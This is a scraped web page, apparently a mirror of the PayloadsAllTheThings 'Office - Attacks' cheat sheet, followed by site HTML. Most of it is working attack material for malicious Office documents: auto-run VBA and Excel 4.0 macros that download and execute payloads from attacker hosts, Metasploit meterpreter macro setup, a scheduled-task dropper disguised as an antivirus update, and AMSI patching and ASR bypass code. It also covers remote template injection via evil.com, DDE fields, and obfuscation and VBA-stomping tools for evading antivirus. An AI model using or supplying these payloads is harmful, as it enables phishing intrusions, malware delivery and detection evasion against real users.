--scfile &lt;path&gt; Path to shellcode file as CSharp byte array python SharpShooter.py --payload slk --rawscfile shellcode.bin --output test # Creation of a VBA Macro # creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a hosted stylesheet. SharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl # Creation of an Excel 4.0 SLK Macro Enabled Document ~# /!\\ The shellcode cannot contain null bytes msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b &#39;\\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile ~./x86payload.bin --smuggle --template mcafee msfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b &#39;\\x00&#39; SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --smuggle --template mcafee XLM Excel 4.0 - EXCELntDonut XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files. AMSI has no visibility into XLM macros (for now) Anti-virus struggles with XLM (for now) XLM macros can access the Win32 API (virtualalloc, createthread, …) Open an Excel Workbook. Right click on “Sheet 1” and click “Insert…”. Select “MS Excel 4.0 Macro”. Open your EXCELntDonut output file in a text editor and copy everything. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet. At this point, everything is in column A. To fix that, we’ll use the “Text-to-Columns”/”Convert” tool under the “Data” tab. Highlight column A and open the “Text-to-Columns” tool. Select “Delimited” and then “Semicolon” on the next screen. Select “Finished”. Right-click on cell A1* and select “Run”. This will execute your payload to make sure it works. To enable auto-execution, we need to rename cell A1* to “Auto_Open”. You can do this by clicking into cell A1 and then clicking into the box that says “A1”* just above Column A. Change the text from “A1”* to “Auto_Open”. Save the file and verify that auto-execution works. :warning: If you’re using the obfuscate flag, after the Text-to-columns operation, your macros won’t start in A1. Instead, they’ll start at least 100 columns to the right. Scroll horizontally until you see the first cell of text. Let’s say that cell is HJ1. If that’s the case, then complete steps 6-7 substituting HJ1 for A1 git clone https://github.com/FortyNorthSecurity/EXCELntDonut -f path to file containing your C# source code (exe or dll) -c ClassName where method that you want to call lives (dll) -m Method containing your executable payload (dll) -r References needed to compile your C# code (ex: -r &#39;System.Management&#39;) -o output filename --sandbox Perform basic sandbox checks. --obfuscate Perform basic macro obfuscation. # Fork git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs donut.exe -a1 -o GruntHttpx86.bin GruntHttpX86.exe donut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe usage: drive.py [-h] --x64bin X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate] python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md XLM Excel 4.0 - EXEC Right Click to the current sheet Insert a Macro IntL MS Excel 4.0 Add the EXEC macro 1 2 =EXEC(&quot;poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg(&#39;http://10.10.10.10:80/update.ps1&#39;)&quot;) =halt() Rename cell to Auto_open Hide your macro worksheet by a right mouse click on the sheet name Macro1 and selecting Hide DOCM - Metasploit use exploit/multi/fileformat/office_word_macro set payload windows/meterpreter/reverse_http set LHOST 10.10.10.10 set LPORT 80 set DisablePayloadHandler True set PrependMigrate True set FILENAME Financial2021.docm exploit -j DOCM - Download and Execute Detected by Defender (AMSI) Sub Execute() Dim payload payload = &quot;powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring(&#39;http://10.10.10.10:4242/exploit&#39;);&quot; Call Shell(payload, vbHide) End Sub Sub Document_Open() Execute End Sub DOCM - Macro Creator https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator # Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion: C:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body # Shellcode delivered over WebDAV covert channel, with obfuscation, no sandbox evasion: C:\\PS&gt; Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o # Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion: C:\\PS&gt; Invoke-MacroCreator -i regsvr32.sct -t file -url &#39;http://my.server.com/sources.xml&#39; -d biblio -c &#39;regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll&#39; -o -e DOCM - C# converted to Office VBA macro A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted. https://github.com/trustedsec/unicorn python unicorn.py payload.cs cs macro DOCM - VBA Wscript https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office Sub parent_change() Dim objOL Set objOL = CreateObject(&quot;Outlook.Application&quot;) Set shellObj = objOL.CreateObject(&quot;Wscript.Shell&quot;) shellObj.Run(&quot;notepad.exe&quot;) End Sub Sub AutoOpen() parent_change End Sub Sub Auto_Open() parent_change End Sub 1 2 CreateObject(&quot;WScript.Shell&quot;).Run &quot;calc.exe&quot; CreateObject(&quot;WScript.Shell&quot;).Exec &quot;notepad.exe&quot; DOCM - VBA Shell Execute Comment Set your command payload inside the Comment metadata of the document. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 Sub beautifulcomment() Dim p As DocumentProperty For Each p In ActiveDocument.BuiltInDocumentProperties If p.Name = &quot;Comments&quot; Then Shell (p.Value) End If Next End Sub Sub AutoExec() beautifulcomment End Sub Sub AutoOpen() beautifulcomment End Sub DOCM - VBA Spawning via svchost.exe using Scheduled Task Sub AutoOpen() Set service = CreateObject(&quot;Schedule.Service&quot;) Call service.Connect Dim td: Set td = service.NewTask(0) td.RegistrationInfo.Author = &quot;Kaspersky Corporation&quot; td.settings.StartWhenAvailable = True td.settings.Hidden = False Dim triggers: Set triggers = td.triggers Dim trigger: Set trigger = triggers.Create(1) Dim startTime: ts = DateAdd(&quot;s&quot;, 30, Now) startTime = Year(ts) &amp; &quot;-&quot; &amp; Right(Month(ts), 2) &amp; &quot;-&quot; &amp; Right(Day(ts), 2) &amp; &quot;T&quot; &amp; Right(Hour(ts), 2) &amp; &quot;:&quot; &amp; Right(Minute(ts), 2) &amp; &quot;:&quot; &amp; Right(Second(ts), 2) trigger.StartBoundary = startTime trigger.ID = &quot;TimeTriggerId&quot; Dim Action: Set Action = td.Actions.Create(0) Action.Path = &quot;C:\\Windows\\System32\\powershell.exe&quot; Action.Arguments = &quot;-nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; Call service.GetFolder(&quot;\\&quot;).RegisterTaskDefinition(&quot;AVUpdateTask&quot;, td, 6, , , 3) End Sub Rem powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.1.59:80/fezsdfqs&#39;))&quot; DOCM - WMI COM functions Basic WMI exec (detected by Defender) : r = GetObject(&quot;winmgmts:\\\\.\\root\\cimv2:Win32_Process&quot;).Create(&quot;calc.exe&quot;, null, null, intProcessID) Sub wmi_exec() strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;winmgmts:\\\\&quot; &amp; strComputer &amp; &quot;\\root\\cimv2&quot;) Set objStartUp = objWMIService.Get(&quot;Win32_ProcessStartup&quot;) Set objProc = objWMIService.Get(&quot;Win32_Process&quot;) Set procStartConfig = objStartUp.SpawnInstance_ procStartConfig.ShowWindow = 1 objProc.Create &quot;powershell.exe&quot;, Null, procStartConfig, intProcessID End Sub https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3 https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2 Sub ASR_bypass_create_child_process_rule5() Const HIDDEN_WINDOW = 0 strComputer = &quot;.&quot; Set objWMIService = GetObject(&quot;win&quot; &amp; &quot;mgmts&quot; &amp; &quot;:\\\\&quot; &amp; strComputer &amp; &quot;\\root&quot; &amp; &quot;\\cimv2&quot;) Set objStartup = objWMIService.Get(&quot;Win32_&quot; &amp; &quot;Process&quot; &amp; &quot;Startup&quot;) Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject(&quot;winmgmts:\\\\&quot; &amp; strComputer &amp; &quot;\\root&quot; &amp; &quot;\\cimv2&quot; &amp; &quot;:Win32_&quot; &amp; &quot;Process&quot;) objProcess.Create &quot;cmd.exe /c powershell.exe IEX ( IWR -uri &#39;http://10.10.10.10/stage.ps1&#39;)&quot;, Null, objConfig, intProcessID End Sub Sub AutoExec() ASR_bypass_create_child_process_rule5 End Sub Sub AutoOpen() ASR_bypass_create_child_process_rule5 End Sub Const ShellWindows = &quot;{9BA05972-F6A8-11CF-A442-00A0C90A8F39}&quot; Set SW = GetObject(&quot;new:&quot; &amp; ShellWindows).Item() SW.Document.Application.ShellExecute &quot;cmd.exe&quot;, &quot;/c powershell.exe&quot;, &quot;C:\\Windows\\System32&quot;, Null, 0 DOCM/XLM - Macro Pack - Macro and DDE Only the community version is available online. git clone https://github.com/sevagas/macro_pack https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # Options -G, --generate=OUTPUT_FILE_PATH. Generates a file. -t, --template=TEMPLATE_NAME Use code template already included in MacroPack -o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions and variables name) # Execute a command echo &quot;calc.exe&quot; | macro_pack.exe -t CMD -G cmd.xsl # Download and execute a file echo &lt;file_to_drop_url&gt; &quot;&lt;download_path&gt;&quot; | macro_pack.exe -t DROPPER -o -G dropper.xls # Meterpreter reverse TCP template using MacroMeter by Cn33liz echo &lt;ip&gt; &lt;port&gt; | macro_pack.exe -t METERPRETER -o -G meter.docm # Drop and execute embedded file macro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs # Obfuscate the vba file generated by msfvenom and put result in a new vba file. msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba # Obfuscate Empire stager vba file and generate a MS Word document: macro_pack.exe -f empire.vba -o -G myDoc.docm # Generate an MS Excel file containing an obfuscated dropper (download payload.exe and store as dropped.exe) echo &quot;https://myurl.url/payload.exe&quot; &quot;dropped.exe&quot; | macro_pack.exe -o -t DROPPER -G &quot;drop.xlsm&quot; # Execute calc.exe via Dynamic Data Exchange (DDE) attack echo calc.exe | macro_pack.exe --dde -G calc.xslx # Download and execute file via powershell using Dynamic Data Exchange (DDE) attack macro_pack.exe --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl # PRO: Generate a Word file containing VBA self encoded x64 reverse meterpreter VBA payload (will bypass most AV). msfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --keep-alive -G out.docm # PRO: Trojan a PowerPoint file with a reverse meterpreter. Macro is obfuscated and mangled to bypass AMSI and most antiviruses. msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro_pack.exe -o --autopack --trojan -G hotpics.pptm # PRO: Generate an HTA payload able to run a shellcode via Excel injection echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE --run-in-excel -o -G samples\\nicepic.hta echo meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel -G samples\\my_shortcut.lnk # PRO: XLM Injection echo &quot;MPPro&quot; | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm --run-in-excel # PRO: ShellCode Exec - Heap Injection, AlternativeInjection echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc echo &quot;x32calc.bin&quot; | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection --background -G test.doc # PRO: More shellcodes echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive echo &quot;x86.bin&quot; &quot;x64.bin&quot; | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc echo &quot;http://192.168.5.10:8080/x32calc.bin&quot; &quot;http://192.168.5.10:8080/x64calc.bin&quot; | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\\sc_dl.xls DOCM - CACTUSTORCH VBA Module CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript https://github.com/mdsecactivebreach/CACTUSTORCH https://github.com/tyranid/DotNetToJScript/ CACTUSTORCH - DotNetToJScript all the things - https://youtu.be/YiaKb8nHFSY CACTUSTORCH - CobaltStrike Aggressor Script Addon - https://www.youtube.com/watch?v=_pwH6a-6yAQ Import .cna in Cobalt Strike Generate a new VBA payload from the CACTUSTORCH menu Download DotNetToJscript Compile it DotNetToJscript.exe - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript ExampleAssembly.dll - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text “test” Execute DotNetToJscript.exe and supply it with the ExampleAssembly.dll, specify the output file and the output type DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch Use the generated code to replace the hardcoded binary in CactusTorch DOCM - MMG with Custom DL + Exec Custom Download in first Macro to “C:\\Users\\Public\\beacon.exe” Create a custom binary execute using MMG Merge both Macro git clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator python MMG.py configs/generic-cmd.json malicious.vba { &quot;description&quot;: &quot;Generic command exec payload\\nEvasion technique set to none&quot;, &quot;template&quot;: &quot;templates/payloads/generic-cmd-template.vba&quot;, &quot;varcount&quot;: 152, &quot;encodingoffset&quot;: 5, &quot;chunksize&quot;: 180, &quot;encodedvars&quot;: {}, &quot;vars&quot;: [], &quot;evasion&quot;: [&quot;encoder&quot;], &quot;payload&quot;: &quot;cmd.exe /c C:\\\\Users\\\\Public\\\\beacon.exe&quot; } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 Private Declare PtrSafe Function URLDownloadToFile Lib &quot;urlmon&quot; Alias &quot;URLDownloadToFileA&quot; (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean On Error GoTo Failed DownloadFileA = False &#39;As directory must exist, this is a check If CreateObject(&quot;Scripting.FileSystemObject&quot;).FolderExists(CreateObject(&quot;Scripting.FileSystemObject&quot;).GetParentFolderName(DownloadPath)) = False Then Exit Function Dim returnValue As Long returnValue = URLDownloadToFile(0, URL, DownloadPath, 0, 0) &#39;If return value is 0 and the file exist, then it is considered as downloaded correctly DownloadFileA = (returnValue = 0) And (Len(Dir(DownloadPath)) &gt; 0) Exit Function Failed: End Function Sub AutoOpen() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\\\Users\\\\Public\\\\beacon.exe&quot; End Sub Sub Auto_Open() DownloadFileA &quot;http://10.10.10.10/macro.exe&quot;, &quot;C:\\\\Users\\\\Public\\\\beacon.exe&quot; End Sub DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro Go to Developer tab on ribbon -&gt; Insert -&gt; More Controls -&gt; Microsoft InkPicture Control 1 2 3 Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle) Run = Shell(&quot;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&quot;, vbNormalFocus) End Sub VBA Obfuscation # https://www.youtube.com/watch?v=L0DlPOLx2k0 $ git clone https://github.com/bonnetn/vba-obfuscator $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin VBA Purging VBA Stomping: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format. OfficePurge https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe 1 2 3 4 OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros OfficePurge.exe -d excel -f .\\payroll.xls -m Module1 OfficePurge.exe -d publisher -f .\\donuts.pub -m ThisDocument OfficePurge.exe -d word -f .\\malicious.doc -l EvilClippy Evil Clippy uses the OpenMCDF library to manipulate CFBF files. Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows. If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this. # OSX/Linux mcs /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs # Windows csc /reference:OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out:EvilClippy.exe *.cs EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc # make macro code unaccessible is to mark the project as locked and unviewable: -u # Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag. EvilClippy.exe -r macrofile.doc VBA - Offensive Security Template Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process RunPE - https://github.com/itm4n/VBA-RunPE Spoof Parent - https://github.com/py7hagoras/OfficeMacro64 AMSI Bypass - https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3 VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba VBA - AMSI The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/ :warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy). The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro AMSI Trigger - https://github.com/synacktiv/AMSI-Bypass 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr Private Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtr Private Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As Long Private Declare PtrSafe Sub CopyMemory Lib &quot;kernel32&quot; Alias &quot;RtlMoveMemory&quot; (Destination As Any, Source As Any, ByVal Length As LongPtr) Private Sub Document_Open() Dim AmsiDLL As LongPtr Dim AmsiScanBufferAddr As LongPtr Dim result As Long Dim MyByteArray(6) As Byte Dim ArrayPointer As LongPtr MyByteArray(0) = 184 &#39; 0xB8 MyByteArray(1) = 87 &#39; 0x57 MyByteArray(2) = 0 &#39; 0x00 MyByteArray(3) = 7 &#39; 0x07 MyByteArray(4) = 128 &#39; 0x80 MyByteArray(5) = 195 &#39; 0xC3 AmsiDLL = LoadLibrary(&quot;amsi.dll&quot;) AmsiScanBufferAddr = GetProcAddress(AmsiDLL, &quot;AmsiScanBuffer&quot;) result = VirtualProtect(ByVal AmsiScanBufferAddr, 5, 64, 0) ArrayPointer = VarPtr(MyByteArray(0)) CopyMemory ByVal AmsiScanBufferAddr, ByVal ArrayPointer, 6 End Sub DOCX - Template Injection :warning: Does not require “Enable Macro” Remote Template A malicious macro is saved in a Word template .dotm file Benign .docx file is created based on one of the default MS Word Document templates Document from step 2 is saved as .docx Document from step 3 is renamed to .zip Document from step 4 gets unzipped .\\word_rels\\settings.xml.rels contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb). 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt; &lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;file:///C:\\Users\\mantvydas\\AppData\\Roaming\\Microsoft\\Templates\\Polished%20resume,%20designed%20by%20MOO.dotx&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; 1 2 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;Relationships xmlns=&quot;http://schemas.openxmlformats.org/package/2006/relationships&quot;&gt;&lt;Relationship Id=&quot;rId1&quot; Type=&quot;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&quot; Target=&quot;https://evil.com/malicious.dotm&quot; TargetMode=&quot;External&quot;/&gt;&lt;/Relationships&gt; File gets zipped back up again and renamed to .docx Template Injections Tools https://github.com/JohnWoodman/remoteInjector https://github.com/ryhanson/phishery $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx [+] Opening Word document: good.docx [+] Setting Word document template to: https://secure.site.local/docs [+] Saving injected Word document to: bad.docx [*] Injected Word document has been saved! DOCX - DDE Insert &gt; QuickPart &gt; Field Right Click &gt; Toggle Field Code { DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe &quot;/k calc.exe&quot; } SLK - Excel ID;P O;E NN;NAuto_open;ER101C1;KOut Flank;F C;X1;Y101;K0;EEXEC(&quot;c:\\shell.cmd&quot;) C;X1;Y102;K0;EHALT() E References VBA RunPE Part 1 - itm4n VBA RunPE Part 2 - itm4n Office VBA AMSI Parting the veil on malicious macros - Microsoft Bypassing AMSI fro VBA - Outflank Evil Clippy MS Office Maldoc Assistant - Outflank Old schoold evil execl 4.0 macros XLM - Outflank Excel 4 Macro Generator x86/x64 - bytecod3r VBad - Pepitoh Excel 4.0 Macro Function Reference PDF Excel 4.0 Macros so hot right now - SneekyMonkey Macros and more with sharpshooter v2.0 - mdsec Further evasion in the forgotten corners of ms xls - malware.pizza Excel 4.0 macro old but new - fsx30 XLS 4.0 macros and covenant - d-sec Inject macro from a remote dotm template - ired.team Phishinh with OLE - ired.team Phishing SLK - ired.teambypassing-malicious-macro-detections-by-defeating-child-parent-process-relationships) PropertyBomb an old new technique for arbitrary code execution in vba macro - Leon Berlin - 22 May 2018 AMSI in the heap - rmdavy WordAMSIBypass - rmdavy Dechaining macros and evading EDR - Noora Hyvärinen Executing macros from docx with remote - RedXORBlueJuly 18, 2018 One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021 Running macros via ActiveX controls - greyhathacker - September 29, 2016 Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Office - Attacks | PayloadsAllTheThings
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="PayloadsAllTheThings">
<meta name="application-name" content="PayloadsAllTheThings">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- Google Tag and Analytics -->
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-BJ57VSC3B5"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-BJ57VSC3B5');
</script>
<!-- Translate website -->
<script>
/*
  function googleTranslateElementInit() {

  new google.translate.TranslateElement(
    {
      pageLanguage: "en",
      includedLanguages: "en,id",
      layout: google.translate.TranslateElement.InlineLayout.SIMPLE
    },
    "google_translate_element"
  );
}
setTimeout( function() {
  googleTranslateElementInit();
  }, 500);
*/
</script>
  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScripts -->
<!-- <script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script> -->
  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

  <script defer
    src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script>

  <!--
  JS selector for site.
-->


  



  <!-- image lazy-loading & popup -->
  <script async
    src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js"></script>





<script defer src="/assets/js/dist/post.min.js"></script>





</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end">

  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/logo.jpg" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">PayloadsAllTheThings</a>
    </div>

    <div class="site-subtitle font-italic">A list of useful payloads</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">
    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/Zxce3" aria-label="github"
        class="order-3"
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/Zxce3_" aria-label="twitter"
        class="order-4"
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['Zxce3','protonmail.com'].join('@')" aria-label="email"
        class="order-5"
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        class="order-6"
        >
